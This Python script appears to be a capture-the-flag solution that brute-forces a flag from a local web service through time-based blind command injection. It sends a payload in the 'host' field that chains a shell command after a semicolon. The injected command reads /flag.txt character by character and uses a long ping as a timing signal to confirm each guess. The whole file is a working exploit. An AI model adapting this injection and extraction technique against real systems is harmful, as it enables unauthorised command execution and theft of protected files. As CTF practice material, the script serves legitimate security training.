import requests

URL = 'http://localhost:5000/flag'
correct = 'DEAD{'
fuzzing = '0123456789-abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!_{}'
c = 6

for i in range(50):
	for fuzz in fuzzing:
		data = {'host':f';[ "$(head -c {c+i} /flag.txt)" = "{correct+fuzz}" ] && ping -c 200 127.0.0.1 || id'}
		try:
		    res = requests.post(URL, data=data, timeout=1)

		except requests.exceptions.Timeout:
		    correct += fuzz
		    print(correct)
		    
		    break
		if correct.endswith('}'):
		    	break
	if correct.endswith('}'):
		    	break
